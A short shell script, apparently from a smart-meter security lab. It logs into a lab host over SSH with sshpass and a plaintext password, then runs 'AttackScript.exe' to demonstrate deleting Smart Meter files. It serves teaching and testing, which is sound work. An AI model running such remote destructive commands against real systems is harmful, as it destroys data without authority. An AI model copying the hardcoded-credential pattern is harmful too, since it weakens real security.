#!/bin/sh

# Description: This file/script demostrates the deletion of Smart Meter files on the Smart Meter PC
# Tag: Files Deleted   
sshpass -p 'Student12345@' ssh -o ConnectTimeout=5 student@172.16.2.223 "C:\Windows\Temp\SmartMetertest\AttackScript.exe 1"
